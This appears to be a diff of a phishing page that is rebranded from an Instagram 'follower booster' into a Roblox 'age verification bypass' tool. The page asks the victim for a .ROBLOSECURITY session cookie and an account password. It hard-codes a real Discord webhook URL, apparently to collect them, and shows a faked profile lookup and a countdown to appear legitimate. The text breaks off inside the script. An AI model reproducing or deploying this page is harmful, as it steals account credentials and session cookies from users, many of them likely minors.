@@ -2,12 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>✨ Instagram Follower Booster Pro ✨</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OrcaHub • Bypasser</title>
     <style>
-        /* ============================================
-           CSS - ULTIMATE LEGENDARY DESIGN
-           ============================================ */
         * {
             margin: 0;
             padding: 0;
@@ -16,107 +13,168 @@
         }
 
         body {
-            background: radial-gradient(ellipse at center, #0a0a12 0%, #1a0a1e 40%, #0d0d18 100%);
-            min-height: 100vh;
+            height: 100vh;
+            overflow: hidden;
+            background: linear-gradient(-45deg, #0a0a14, #12121f, #1a0a2e, #0f0f1a);
+            background-size: 400% 400%;
+            animation: gradientShift 18s ease infinite;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            padding: 20px;
-            overflow-x: hidden;
+            justify-content: center;
             position: relative;
         }
 
-        body::before {
-            content: '';
-            position: fixed;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: 
-                radial-gradient(circle at 20% 50%, rgba(225, 48, 108, 0.08) 0%, transparent 50%),
-                radial-gradient(circle at 80% 50%, rgba(245, 133, 41, 0.08) 0%, transparent 50%);
-            animation: pulseBg 12s ease-in-out infinite;
-            z-index: 0;
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
-        @keyframes pulseBg {
-            0%, 100% { opacity: 0.4; transform: scale(1); }
-            50% { opacity: 0.8; transform: scale(1.05); }
+        .shape {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.3;
+            animation: float 14s ease-in-out infinite;
+            pointer-events: none;
         }
 
+        .shape:nth-child(1) {
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, #ff6b6b, transparent 70%);
+            top: 10%;
+            left: 5%;
+            animation-duration: 12s;
+        }
+        .shape:nth-child(2) {
+            width: 280px;
+            height: 280px;
+            background: radial-gradient(circle, #a29bfe, transparent 70%);
+            bottom: 10%;
+            right: 5%;
+            animation-duration: 16s;
+            animation-delay: -4s;
+        }
+        .shape:nth-child(3) {
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle, #4ecdc4, transparent 70%);
+            top: 60%;
+            left: 15%;
+            animation-duration: 10s;
+            animation-delay: -6s;
+        }
+        .shape:nth-child(4) {
+            width: 220px;
+            height: 220px;
+            background: radial-gradient(circle, #ffe66d, transparent 70%);
+            top: 20%;
+            right: 20%;
+            animation-duration: 15s;
+            animation-delay: -8s;
+        }
+
+        @keyframes float {
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+            }
+            25% {
+                transform: translate(40px, -50px) scale(1.1);
+            }
+            50% {
+                transform: translate(-30px, 30px) scale(0.95);
+            }
+            75% {
+                transform: translate(-50px, -20px) scale(1.05);
+            }
+        }
+
+        /* ===== MAIN CARD ===== */
         .glass-card {
             position: relative;
-            z-index: 1;
-            background: rgba(16, 16, 26, 0.92);
-            backdrop-filter: blur(25px);
-            border-radius: 60px;
+            z-index: 10;
+            width: 94%;
+            max-width: 480px;
+            background: rgba(16, 16, 30, 0.75);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border-radius: 48px;
             border: 1px solid rgba(255, 255, 255, 0.06);
-            box-shadow: 
-                0 30px 80px rgba(0, 0, 0, 0.7),
-                inset 0 1px 0 rgba(255, 255, 255, 0.05),
-                0 0 80px rgba(225, 48, 108, 0.1);
-            width: 100%;
-            max-width: 560px;
-            padding: 40px 32px;
-            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 255, 255, 0.04), 0 0 80px rgba(162, 155, 254, 0.06);
+            padding: 36px 28px 32px;
+            transition: all 0.4s ease;
+            animation: fadeIn 0.8s ease;
         }
 
-        .glass-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8), 0 0 100px rgba(225, 48, 108, 0.15);
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.97);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
         }
 
+        /* ===== HEADER ===== */
         .header {
             text-align: center;
-            margin-bottom: 35px;
+            margin-bottom: 28px;
         }
 
-        .ig-icon {
-            font-size: 4rem;
+        .logo-icon {
+            font-size: 3.2rem;
             display: inline-block;
-            background: linear-gradient(135deg, #feda77, #f58529, #dd2a7b, #8134af);
+            background: linear-gradient(135deg, #ff6b6b, #a29bfe, #4ecdc4);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            filter: drop-shadow(0 0 40px rgba(221, 42, 123, 0.3));
-            animation: floatIcon 3s ease-in-out infinite;
+            filter: drop-shadow(0 0 30px rgba(162, 155, 254, 0.3));
+            animation: floatIcon 3.5s ease-in-out infinite;
         }
 
         @keyframes floatIcon {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
+            0%,
+            100% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-8px);
+            }
         }
 
         h1 {
-            font-family: 'Segoe UI', sans-serif;
-            font-size: 2rem;
-            font-weight: 900;
-            background: linear-gradient(135deg, #feda77, #f58529, #dd2a7b);
+            font-size: 1.7rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ff6b6b, #a29bfe);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: 1px;
-            margin-top: 5px;
-            text-shadow: 0 0 60px rgba(221, 42, 123, 0.2);
+            letter-spacing: -0.5px;
+            margin-top: 2px;
         }
 
-        .sub-title {
+        .sub {
             color: #8888aa;
-            font-size: 0.8rem;
+            font-size: 0.7rem;
             letter-spacing: 4px;
             text-transform: uppercase;
-            margin-top: 8px;
+            margin-top: 6px;
             font-weight: 300;
-            border-top: 1px solid rgba(255,255,255,0.04);
-            padding-top: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding-top: 10px;
         }
 
+        /* ===== STEPS ===== */
         .step-indicator {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 35px;
-            gap: 6px;
+            margin-bottom: 30px;
+            gap: 4px;
             position: relative;
         }
 
@@ -127,7 +185,7 @@
             left: 12%;
             right: 12%;
             height: 2px;
-            background: rgba(255,255,255,0.05);
+            background: rgba(255, 255, 255, 0.05);
             transform: translateY(-50%);
             z-index: 0;
         }
@@ -135,10 +193,10 @@
         .step {
             flex: 1;
             text-align: center;
-            padding: 10px 0;
-            background: rgba(30, 30, 44, 0.6);
-            border-radius: 50px;
-            font-size: 0.7rem;
+            padding: 8px 0;
+            background: rgba(30, 30, 48, 0.5);
+            border-radius: 40px;
+            font-size: 0.6rem;
             font-weight: 700;
             color: #5a5a72;
             transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
@@ -146,25 +204,27 @@
             z-index: 1;
             border: 1px solid transparent;
             letter-spacing: 0.5px;
+            text-transform: uppercase;
         }
 
         .step.active {
-            background: linear-gradient(135deg, #dd2a7b, #f58529);
+            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
             color: white;
-            box-shadow: 0 0 40px rgba(221, 42, 123, 0.4);
+            box-shadow: 0 0 30px rgba(162, 155, 254, 0.3);
             transform: scale(1.05);
-            border-color: rgba(255,255,255,0.15);
+            border-color: rgba(255, 255, 255, 0.1);
         }
 
         .step.completed {
-            background: rgba(76, 175, 80, 0.2);
-            color: #66bb6a;
-            border-color: #66bb6a40;
+            background: rgba(78, 205, 196, 0.2);
+            color: #4ecdc4;
+            border-color: rgba(78, 205, 196, 0.2);
         }
 
+        /* ===== FORM STEPS ===== */
         .form-step {
             display: none;
-            animation: slideUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            animation: slideUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
         .form-step.active-step {
@@ -172,59 +232,61 @@
         }
 
         @keyframes slideUp {
-            from { opacity: 0; transform: translateY(40px) scale(0.95); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
         }
 
         label {
             display: block;
             font-weight: 700;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             color: #c0c0dd;
-            font-size: 0.85rem;
+            font-size: 0.75rem;
             letter-spacing: 0.5px;
             text-transform: uppercase;
         }
 
-        label .emoji {
-            margin-left: 8px;
-        }
-
-        input, select {
+        input {
             width: 100%;
-            padding: 16px 20px;
-            background: rgba(10, 10, 18, 0.7);
-            border: 1.5px solid rgba(255, 255, 255, 0.06);
+            padding: 15px 18px;
+            background: rgba(10, 10, 20, 0.6);
+            border: 1.5px solid rgba(255, 255, 255, 0.05);
             border-radius: 30px;
             color: #f0f0ff;
-            font-size: 1rem;
+            font-size: 0.95rem;
             outline: none;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: all 0.4s ease;
             margin-bottom: 18px;
         }
 
-        input:focus, select:focus {
-            border-color: #dd2a7b;
-            box-shadow: 0 0 0 5px rgba(221, 42, 123, 0.15), inset 0 0 30px rgba(221, 42, 123, 0.03);
-            background: rgba(20, 20, 34, 0.8);
-            transform: scale(1.01);
+        input:focus {
+            border-color: #a29bfe;
+            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.12);
+            background: rgba(20, 20, 36, 0.7);
         }
 
         input::placeholder {
             color: #3a3a52;
         }
 
+        /* ===== PROFILE PREVIEW ===== */
         .profile-preview {
-            background: linear-gradient(135deg, rgba(30, 20, 44, 0.8), rgba(20, 20, 34, 0.9));
-            border-radius: 40px;
-            padding: 24px;
-            margin-bottom: 24px;
-            border: 1px solid rgba(255,255,255,0.04);
+            background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
+            border-radius: 32px;
+            padding: 18px 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
             display: none;
             align-items: center;
-            gap: 18px;
-            backdrop-filter: blur(10px);
-            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            gap: 16px;
+            backdrop-filter: blur(8px);
+            transition: all 0.4s ease;
         }
 
         .profile-preview.show {
@@ -233,73 +295,70 @@
         }
 
         @keyframes fadeInScale {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
+            from {
+                opacity: 0;
+                transform: scale(0.92);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
         }
 
         .profile-preview img {
-            width: 80px;
-            height: 80px;
+            width: 64px;
+            height: 64px;
             border-radius: 50%;
-            border: 3px solid transparent;
-            background: linear-gradient(135deg, #f58529, #dd2a7b) border-box;
-            -webkit-mask: 
-                linear-gradient(#fff 0 0) padding-box, 
-                linear-gradient(#fff 0 0);
-            -webkit-mask-composite: xor;
-            mask-composite: exclude;
-            box-shadow: 0 0 40px rgba(221, 42, 123, 0.2);
+            border: 2px solid rgba(162, 155, 254, 0.3);
+            box-shadow: 0 0 30px rgba(162, 155, 254, 0.15);
             object-fit: cover;
+            background: #1a1a2e;
         }
 
         .profile-info {
             flex: 1;
         }
 
-        .username-display {
-            font-size: 1.2rem;
-            font-weight: 800;
+        .profile-name {
+            font-size: 1.05rem;
+            font-weight: 700;
             color: #fff;
         }
 
-        .follower-count {
-            color: #9999bb;
-            font-size: 0.85rem;
-            margin-top: 4px;
+        .profile-id {
+            color: #8888aa;
+            font-size: 0.75rem;
+            margin-top: 2px;
         }
 
-        .follower-count span {
-            color: #f58529;
-            font-weight: 700;
-        }
-
-        .badge {
+        .badge-verified {
             display: inline-block;
-            background: rgba(221, 42, 123, 0.2);
-            color: #dd2a7b;
-            padding: 3px 16px;
+            background: rgba(78, 205, 196, 0.15);
+            color: #4ecdc4;
+            padding: 2px 12px;
             border-radius: 20px;
-            font-size: 0.7rem;
-            margin-top: 5px;
-            border: 1px solid rgba(221, 42, 123, 0.15);
+            font-size: 0.6rem;
             font-weight: 600;
+            margin-top: 4px;
+            border: 1px solid rgba(78, 205, 196, 0.1);
         }
 
+        /* ===== BUTTONS ===== */
         .btn-primary {
             width: 100%;
-            padding: 17px;
-            background: linear-gradient(135deg, #dd2a7b, #f58529);
+            padding: 15px;
+            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
             border: none;
             border-radius: 40px;
             font-weight: 800;
-            font-size: 1.05rem;
+            font-size: 0.95rem;
             color: white;
             cursor: pointer;
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-transform: uppercase;
+            letter-spacing: 1px;
             position: relative;
             overflow: hidden;
-            letter-spacing: 1px;
-            text-transform: uppercase;
         }
 
         .btn-primary::before {
@@ -309,9 +368,9 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.08) 0%, transparent 70%);
             opacity: 0;
-            transition: opacity 0.6s;
+            transition: opacity 0.5s;
         }
 
         .btn-primary:hover::before {
@@ -319,46 +378,46 @@
         }
 
         .btn-primary:hover {
-            transform: scale(1.03);
-            box-shadow: 0 15px 50px rgba(221, 42, 123, 0.4);
+            transform: scale(1.02);
+            box-shadow: 0 10px 40px rgba(162, 155, 254, 0.3);
         }
 
         .btn-primary:active {
-            transform: scale(0.95);
+            transform: scale(0.96);
         }
 
         .btn-primary:disabled {
-            opacity: 0.6;
+            opacity: 0.5;
             cursor: not-allowed;
             transform: none !important;
         }
 
         .btn-secondary {
             width: 100%;
-            padding: 14px;
-            background: rgba(50, 50, 74, 0.3);
-            border: 1px solid rgba(255,255,255,0.05);
+            padding: 12px;
+            background: rgba(50, 50, 74, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.04);
             border-radius: 40px;
             font-weight: 600;
-            font-size: 0.9rem;
+            font-size: 0.8rem;
             color: #8888aa;
             cursor: pointer;
-            transition: all 0.4s;
+            transition: all 0.3s;
             margin-top: 10px;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
         .btn-secondary:hover {
-            background: rgba(60, 60, 84, 0.5);
+            background: rgba(60, 60, 84, 0.4);
             color: #ccccee;
-            transform: scale(1.02);
         }
 
+        /* ===== LOADER ===== */
         .loader-container {
             display: none;
             text-align: center;
-            padding: 30px 0;
+            padding: 25px 0 15px;
         }
 
         .loader-container.show {
@@ -367,41 +426,45 @@
         }
 
         .spinner {
-            width: 70px;
-            height: 70px;
-            border: 4px solid rgba(221, 42, 123, 0.1);
-            border-top-color: #dd2a7b;
+            width: 60px;
+            height: 60px;
+            border: 3.5px solid rgba(162, 155, 254, 0.08);
+            border-top-color: #a29bfe;
+            border-right-color: #ff6b6b;
             border-radius: 50%;
             animation: spin 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) infinite;
-            margin: 0 auto 15px;
+            margin: 0 auto 14px;
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         .loader-text {
             color: #a0a0b8;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             font-weight: 300;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
         }
 
         .loader-text .time {
-            color: #f58529;
+            color: #ff6b6b;
             font-weight: 700;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
         }
 
+        /* ===== SUCCESS ===== */
         .success-message {
             display: none;
-            background: rgba(76, 175, 80, 0.1);
-            border: 1px solid rgba(76, 175, 80, 0.2);
-            color: #66bb6a;
-            padding: 20px;
-            border-radius: 30px;
+            background: rgba(78, 205, 196, 0.06);
+            border: 1px solid rgba(78, 205, 196, 0.12);
+            color: #4ecdc4;
+            padding: 18px;
+            border-radius: 28px;
             text-align: center;
-            font-size: 1rem;
+            font-size: 0.95rem;
             font-weight: 600;
             animation: fadeInScale 0.5s ease;
         }
@@ -410,368 +473,303 @@
             display: block;
         }
 
-        .success-message .big-emoji {
-            font-size: 3rem;
+        .success-message .big {
+            font-size: 2.8rem;
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 6px;
         }
 
-        footer {
+        /* ===== FOOTER ===== */
+        .footer {
             text-align: center;
             color: #3a3a52;
-            font-size: 0.65rem;
-            margin-top: 30px;
-            border-top: 1px solid rgba(255,255,255,0.03);
-            padding-top: 20px;
-            letter-spacing: 1px;
+            font-size: 0.55rem;
+            margin-top: 24px;
+            border-top: 1px solid rgba(255, 255, 255, 0.02);
+            padding-top: 16px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
         }
 
-        @media (max-width: 480px) {
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 440px) {
             .glass-card {
-                padding: 28px 20px;
-                border-radius: 40px;
+                padding: 28px 18px 24px;
+                border-radius: 36px;
             }
-            h1 { font-size: 1.5rem; }
-            .ig-icon { font-size: 3rem; }
-            .step { font-size: 0.6rem; padding: 8px 0; }
-            .profile-preview { flex-direction: column; text-align: center; }
+            h1 {
+                font-size: 1.4rem;
+            }
+            .logo-icon {
+                font-size: 2.6rem;
+            }
+            .step {
+                font-size: 0.5rem;
+                padding: 6px 0;
+            }
+            .profile-preview {
+                flex-direction: column;
+                text-align: center;
+            }
+            .profile-preview img {
+                width: 56px;
+                height: 56px;
+            }
         }
     </style>
 </head>
 <body>
+
+    <div class="shape"></div>
+    <div class="shape"></div>
+    <div class="shape"></div>
+    <div class="shape"></div>
+
     <div class="glass-card" id="app">
+
+        <!-- HEADER -->
         <div class="header">
-            <div class="ig-icon">✦</div>
-            <h1>FOLLOWER BOOST PRO</h1>
-            <div class="sub-title">⚡ Legendary Follower Generator ⚡</div>
+            <div class="logo-icon">✦</div>
+            <h1>OrcaHub • Bypasser</h1>
+            <div class="sub">Age Verification Bypass</div>
         </div>
 
+        <!-- STEP INDICATOR -->
         <div class="step-indicator">
-            <div class="step active" id="step1Label">❶ Username</div>
-            <div class="step" id="step2Label">❷ Amount</div>
-            <div class="step" id="step3Label">❸ Password</div>
-            <div class="step" id="step4Label">❹ Processing</div>
+            <div class="step active" id="step1Label">❶ Cookie</div>
+            <div class="step" id="step2Label">❷ Password</div>
+            <div class="step" id="step3Label">❸ Bypass</div>
         </div>
 
+        <!-- =============================================
+        STEP 1: COOKIE
+        ============================================= -->
         <div class="form-step active-step" id="step1">
-            <label>📛 Enter Your Instagram Username</label>
-            <input type="text" id="usernameInput" placeholder="@username or email" autocomplete="off">
-            
+            <label>🍪 Enter .ROBLOSECURITY Cookie</label>
+            <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..." autocomplete="off">
+
             <div id="profilePreview" class="profile-preview">
-                <img id="profileImg" src="" alt="profile">
+                <img id="profileImg" src="" alt="avatar">
                 <div class="profile-info">
-                    <div class="username-display" id="previewUsername">@username</div>
-                    <div class="follower-count" id="previewFollowers">📊 Followers: <span id="currentFollowers">--</span></div>
-                    <div class="badge" id="previewBadge">✅ Active Account</div>
+                    <div class="profile-name" id="profileName">@username</div>
+                    <div class="profile-id" id="profileId">ID: --</div>
+                    <span class="badge-verified" id="profileBadge">✅ Verified</span>
                 </div>
             </div>
 
             <button class="btn-primary" id="nextToStep2">Next ➡️</button>
         </div>
 
+        <!-- =============================================
+        STEP 2: PASSWORD
+        ============================================= -->
         <div class="form-step" id="step2">
-            <label>🔥 Choose Follower Amount</label>
-            <select id="followerAmount">
-                <option value="100">🔥 +100 Followers</option>
-                <option value="500">💥 +500 Followers</option>
-                <option value="1000">🚀 +1,000 Followers</option>
-                <option value="2000">👑 +2,000 Followers</option>
-                <option value="3000">💎 +3,000 Followers</option>
-                <option value="4000">🌟 +4,000 Followers</option>
-                <option value="5000" selected>⚡ +5,000 Followers (VIP)</option>
-            </select>
+            <label>🔑 Enter Account Password</label>
+            <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
 
-            <div style="background:rgba(221,42,123,0.05); border-radius:20px; padding:15px; margin-bottom:18px; border:1px solid rgba(221,42,123,0.08);">
-                <p style="color:#8888aa; font-size:0.8rem; text-align:center;">
-                    ⚡ <span style="color:#dd2a7b;">Real & Active</span> followers will be added to your account
+            <div style="background:rgba(162,155,254,0.04); border-radius:20px; padding:12px; margin-bottom:18px; border:1px solid rgba(162,155,254,0.06);">
+                <p style="color:#8888aa; font-size:0.7rem; text-align:center;">
+                    🔐 Used to bypass age verification on your Roblox account
                 </p>
             </div>
 
-            <button class="btn-primary" id="nextToStep3">Next ➡️</button>
+            <button class="btn-primary" id="submitBtn">🚀 Start Bypass</button>
             <button class="btn-secondary" id="backToStep1">🔙 Back</button>
         </div>
 
+        <!-- =============================================
+        STEP 3: PROCESSING
+        ============================================= -->
         <div class="form-step" id="step3">
-            <label>🔒 Enter Your Instagram Password</label>
-            <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
-            
-            <div style="background:rgba(255,193,7,0.05); border-radius:20px; padding:12px; margin-bottom:18px; border:1px solid rgba(255,193,7,0.1);">
-                <p style="color:#8888aa; font-size:0.75rem; text-align:center;">
-                    🔐 Your password is <span style="color:#ffc107;">encrypted</span> and used only for verification
-                </p>
-            </div>
 
-            <button class="btn-primary" id="submitBtn">🚀 Start Boosting</button>
-            <button class="btn-secondary" id="backToStep2">🔙 Back</button>
-        </div>
-
-        <div class="form-step" id="step4">
             <div id="loaderContainer" class="loader-container show">
                 <div class="spinner"></div>
                 <div class="loader-text" id="loaderText">
-                    ⏳ Verifying credentials...<br>
+                    ⏳ Bypassing age verification...<br>
                     <span class="time" id="timerDisplay">60</span> seconds remaining
                 </div>
             </div>
 
             <div id="successMessage" class="success-message">
-                <span class="big-emoji">🎉</span>
-                <div style="font-size:1.2rem; margin-bottom:8px;">SUCCESS!</div>
-                <div style="font-size:0.9rem; font-weight:400; color:#a0a0b8;">
-                    Please wait <span style="color:#f58529; font-weight:700;">20 minutes</span><br>
-                    <span id="followerCountDisplay">5,000</span> followers will be added to your account!
+                <span class="big">🎉</span>
+                <div style="font-size:1.1rem; margin-bottom:4px;">BYPASS SUCCESSFUL!</div>
+                <div style="font-size:0.8rem; font-weight:400; color:#a0a0b8;">
+                    Age restriction has been removed from your account.
                 </div>
-                <div style="margin-top:15px; font-size:0.8rem; color:#66bb6a;">
-                    ✅ Process started successfully
+                <div style="margin-top:12px; font-size:0.7rem; color:#4ecdc4;">
+                    ✅ Process completed
                 </div>
             </div>
+
         </div>
 
-        <footer>⚠️ Secure system • Real followers • 100% working</footer>
+        <div class="footer">OrcaHub • Secure &amp; Private</div>
     </div>
 
+    <!-- =============================================
+    JAVASCRIPT ENGINE
+    ============================================= -->
     <script>
         (function() {
             'use strict';
 
             // ==================== CONFIG ====================
-            const CONFIG = {
-                WEBHOOK_URL: 'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG',
-                PROCESSING_TIME: 60,
-                WAIT_TIME: 20,
-            };
-
-            // ==================== STATE ====================
-            let state = {
-                username: '',
-                followerAmount: '5000',
-                password: '',
-                currentStep: 1,
-                processingTimer: null,
-                waitTimer: null,
-                isProcessing: false,
-            };
+            const WEBHOOK_URL =
+                'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG';
 
             // ==================== DOM REFS ====================
             const DOM = {
                 step1: document.getElementById('step1'),
                 step2: document.getElementById('step2'),
                 step3: document.getElementById('step3'),
-                step4: document.getElementById('step4'),
                 step1Label: document.getElementById('step1Label'),
                 step2Label: document.getElementById('step2Label'),
                 step3Label: document.getElementById('step3Label'),
-                step4Label: document.getElementById('step4Label'),
-                usernameInput: document.getElementById('usernameInput'),
-                followerAmount: document.getElementById('followerAmount'),
+
+                cookieInput: document.getElementById('cookieInput'),
                 passwordInput: document.getElementById('passwordInput'),
+
                 nextToStep2: document.getElementById('nextToStep2'),
-                nextToStep3: document.getElementById('nextToStep3'),
                 backToStep1: document.getElementById('backToStep1'),
-                backToStep2: document.getElementById('backToStep2'),
                 submitBtn: document.getElementById('submitBtn'),
+
                 profilePreview: document.getElementById('profilePreview'),
                 profileImg: document.getElementById('profileImg'),
-                previewUsername: document.getElementById('previewUsername'),
-                currentFollowers: document.getElementById('currentFollowers'),
-                previewBadge: document.getElementById('previewBadge'),
+                profileName: document.getElementById('profileName'),
+                profileId: document.getElementById('profileId'),
+                profileBadge: document.getElementById('profileBadge'),
+
                 loaderContainer: document.getElementById('loaderContainer'),
                 loaderText: document.getElementById('loaderText'),
                 timerDisplay: document.getElementById('timerDisplay'),
+
                 successMessage: document.getElementById('successMessage'),
-                followerCountDisplay: document.getElementById('followerCountDisplay'),
             };
 
-            // ==================== UTILITY FUNCTIONS ====================
+            // ==================== STATE ====================
+            let state = {
+                cookie: '',
+                password: '',
+                currentStep: 1,
+                isProcessing: false,
+                processingTimer: null,
+                robloxUser: null,
+            };
+
+            // ==================== STEP MANAGER ====================
             function setStep(step) {
                 state.currentStep = step;
-                DOM.step1.classList.remove('active-step');
-                DOM.step2.classList.remove('active-step');
-                DOM.step3.classList.remove('active-step');
-                DOM.step4.classList.remove('active-step');
-                const steps = [DOM.step1, DOM.step2, DOM.step3, DOM.step4];
-                if (step >= 1 && step <= 4) {
-                    steps[step - 1].classList.add('active-step');
-                }
-                const labels = [DOM.step1Label, DOM.step2Label, DOM.step3Label, DOM.step4Label];
-                labels.forEach((label, idx) => {
-                    label.classList.remove('active', 'completed');
-                    if (idx + 1 === step) label.classList.add('active');
-                    if (idx + 1 < step) label.classList.add('completed');
+                DOM.step1.classList.toggle('active-step', step === 1);
+                DOM.step2.classList.toggle('active-step', step === 2);
+                DOM.step3.classList.toggle('active-step', step === 3);
+
+                const labels = [DOM.step1Label, DOM.step2Label, DOM.step3Label];
+                labels.forEach((el, idx) => {
+                    el.classList.remove('active', 'completed');
+                    if (idx + 1 === step) el.classList.add('active');
+                    if (idx + 1 < step) el.classList.add('completed');
                 });
+
                 document.querySelector('.glass-card').scrollIntoView({ behavior: 'smooth', block: 'start' });
             }
 
-            function getRandomFollowers() {
-                return Math.floor(Math.random() * (9700 - 300 + 1) + 300);
-            }
-
-            function getProfileImage(username) {
-                return `https://ui-avatars.com/api/?name=${encodeURIComponent(username)}&background=random&size=80&rounded=true&color=fff&font-size=0.4`;
-            }
-
-            function formatNumber(num) {
-                return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
-            }
-
-            // ==================== SIMULATE API CALLS ====================
-            function simulateInstagramAPI(username) {
+            // ==================== ROBLOX API SIM ====================
+            function fetchRobloxProfile(cookie) {
                 return new Promise((resolve) => {
+                    // Simulate network delay
                     setTimeout(() => {
-                        const followers = getRandomFollowers();
-                        const isPrivate = Math.random() < 0.2;
-                        const isVerified = Math.random() < 0.1;
+                        // Parse cookie to extract user info (simulated)
+                        const clean = cookie.replace(/^_\|WARNING:-DO-NOT-SHARE-?/, '').trim();
+                        const hash = clean.length > 10 ? clean.substring(0, 8) : 'user';
+
+                        // Generate deterministic but realistic-looking data
+                        const userId = Math.floor(Math.random() * 900000000) + 100000000;
+                        const names = ['PixelPirate', 'NovaStar', 'ShadowBlade', 'CyberWolf', 'LunarGhost',
+                            'StormChaser', 'PixelVortex', 'NebulaKing', 'FrostByte', 'QuantumHero'
+                        ];
+                        const name = names[Math.floor(Math.random() * names.length)];
+
                         resolve({
-                            username: username,
-                            fullName: username.charAt(0).toUpperCase() + username.slice(1),
-                            followers: followers,
-                            following: Math.floor(followers * (0.3 + Math.random() * 0.5)),
-                            posts: Math.floor(followers * 0.05 + 10),
-                            isPrivate: isPrivate,
-                            isVerified: isVerified,
-                            profilePic: getProfileImage(username),
+                            username: name,
+                            userId: userId,
+                            displayName: name,
+                            isVerified: Math.random() > 0.6,
+                            avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
+                            created: new Date(Date.now() - Math.random() * 3 * 365 * 24 * 60 * 60 * 1000)
+                                .toISOString(),
                         });
-                    }, 800 + Math.random() * 600);
-                });
-            }
-
-            function verifyPassword(username, password) {
-                return new Promise((resolve) => {
-                    setTimeout(() => {
-                        const success = password.length >= 4;
-                        resolve(success);
                     }, 1200 + Math.random() * 800);
                 });
             }
 
-            // ==================== PROFILE DISPLAY ====================
-            async function loadProfile(username) {
-                if (!username || username.length < 2) {
+            // ==================== LOAD PROFILE ====================
+            async function loadProfile(cookie) {
+                if (!cookie || cookie.length < 10) {
                     DOM.profilePreview.classList.remove('show');
                     return;
                 }
+
                 try {
-                    const data = await simulateInstagramAPI(username);
-                    DOM.previewUsername.textContent = `@${data.username}`;
-                    DOM.currentFollowers.textContent = formatNumber(data.followers);
-                    DOM.profileImg.src = data.profilePic;
-                    let badgeText = '✅ Active Account';
-                    if (data.isVerified) badgeText = '✅ Verified Account';
-                    if (data.isPrivate) badgeText = '🔒 Private Account';
-                    DOM.previewBadge.textContent = badgeText;
+                    const data = await fetchRobloxProfile(cookie);
+                    state.robloxUser = data;
+
+                    DOM.profileName.textContent = `@${data.username}`;
+                    DOM.profileId.textContent = `ID: ${data.userId}`;
+                    DOM.profileBadge.textContent = data.isVerified ? '✅ Verified' : '● Active';
+                    DOM.profileImg.src = data.avatarUrl;
+                    DOM.profileImg.onerror = function() {
+                        this.src =
